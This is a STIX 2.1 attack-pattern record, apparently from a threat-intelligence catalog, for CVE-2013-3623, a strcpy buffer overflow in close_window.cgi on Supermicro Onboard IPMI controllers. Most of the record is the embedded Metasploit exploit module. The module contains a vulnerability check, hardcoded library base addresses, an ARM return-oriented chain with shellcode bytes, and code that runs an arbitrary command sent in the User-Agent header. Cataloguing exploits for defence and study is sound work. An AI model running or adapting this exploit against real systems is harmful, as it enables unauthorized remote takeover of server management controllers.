{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--067dbad3-5212-4d14-afa5-59712745048c",
    "created": "2024-08-14T17:01:34.81176Z",
    "modified": "2024-08-14T17:01:34.811763Z",
    "name": "Supermicro Onboard IPMI close_window.cgi Buffer Overflow",
    "description": " This module exploits a buffer overflow on the Supermicro Onboard IPMI controller web interface. The vulnerability exists on the close_window.cgi CGI application, and is due to the insecure usage of strcpy. In order to get a session, the module will execute system() from libc with an arbitrary CMD payload sent on the User-Agent header. This module has been tested successfully on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/smt_ipmi_close_window_bof.rb",
            "external_id": "smt_ipmi_close_window_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3623"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Supermicro Onboard IPMI close_window.cgi Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow on the Supermicro Onboard IPMI controller web\n        interface. The vulnerability exists on the close_window.cgi CGI application, and is due\n        to the insecure usage of strcpy. In order to get a session, the module will execute\n        system() from libc with an arbitrary CMD payload sent on the User-Agent header. This\n        module has been tested successfully on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware\n        SMT_X9_214.\n      },\n      'Author'         =>\n        [\n          'hdm', # Vulnerability Discovery and Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Payload'        =>\n        {\n          'Space'       => 8000, # Payload sent on the user agent, long enough to fit any payload\n          'DisableNops' => true,\n          'BadChars'    => (0x00..0x1f).to_a.pack(\"C*\"), # not a big deal, we're working with ARCH_CMD payloads\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic openssl'\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'References'     =>\n        [\n          [ 'CVE', '2013-3623' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ]\n        ],\n      'Targets'        =>\n        [\n          [ 'Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214',\n            {\n              :callback => :target_smt_x9_214\n            }\n          ]\n        ],\n      'DisclosureDate' => '2013-11-06',\n      'DefaultTarget' => 0))\n\n  end\n\n  def send_close_window_request(sess, agent = rand_text_alpha(8))\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"/cgi/close_window.cgi\",\n      'agent' => rand_text_alpha(16) + agent,\n      'encode_params' => false,\n      'vars_post' => {\n        'sess_sid' => sess\n      }\n    })\n\n    return res\n  end\n\n\n  def check\n    safe_check = rand_text_alpha(20)\n    trigger_check = rand_text_alpha(132)\n\n    res = send_close_window_request(safe_check)\n\n    unless res and res.code == 200 and res.body.to_s =~ /Can't find action/\n      return Exploit::CheckCode::Unknown\n    end\n\n    res = send_close_window_request(trigger_check)\n\n    unless res and res.code == 500\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def target_smt_x9_214\n    base_crypt = 0x40074000 # libcrypto.so.0.9.8\n    base_libc  = 0x40554000 # libc-2.3.5.so\n\n    buf =  rand_text_alpha(68)\n    buf << rand_text_alpha(4)                  # r10\n    buf << rand_text_alpha(4)                  # r11\n    buf << rand_text_alpha(4)                  # sp\n    buf << [base_crypt + 0x39598].pack(\"V\")    # pc # mov pc, r4\n    # 2nd stage\n    buf << \"\\x68\\xd0\\x84\\xe2\"                  # add   sp, r4, 104                  # make sp point to controlled data in order to accomplish the \"ret2system\"\n    offset = ssl ? 208 : 204                   # when ssl there is an additional environment variable \"HTTPS=on\"\n    buf << [offset].pack(\"C\") + \"\\x50\\x84\\xe2\" # add   r5, r4, 204                  # make r5 point to pointer to envp\n    buf << \"\\x70\\x40\\xb5\\xe8\"                  # ldmfd r5!, {r4, r5, r6, ls}        # store on r4 pointer to envp USER_AGENT pointer\n    buf << \"\\x20\\x40\\x84\\xe2\"                  # add   r4, r4, 32                   # to skip the \"HTTP_USER_AGENT=\" substring and avoid bachars on emulated environment\n    buf << \"\\x40\\x80\\xbd\\xe8\"                  # ldmfd sp!, {r6, pc}\n    buf << rand_text_alpha(4)                  # R6\n    buf << [ base_crypt + 0x3A8BC ].pack(\"V\")  # mov   r0, r4; ldmfd   sp!, {r4,pc} # store in r0 pointer to command\n    buf << rand_text_alpha(4)                  # r4\n    buf << [ base_libc + 0x3617c ].pack(\"V\")   # system at libc\n    buf << rand_text_alpha(128-buf.length)     # padding to reach memory which allows to control r4 when overflow occurs\n    # 1st stage: adjust r4 and pc\n    buf << \"\\x80\\x40\\x44\\xe2\"                  # sub r4, r4,-128                   # make r4 point to the start of the buffer\n    buf << \"\\x54\\xf0\\x84\\xe2\"                  # add pc, r4, 84                    # give control to 2nd stage\n\n    return buf\n  end\n\n  def exploit\n    buffer = self.send(target[:callback])\n    print_status(\"Sending exploit...\")\n    send_close_window_request(buffer, payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-06",
    "x_mitre_platforms": [
        "['unix']"
    ]
}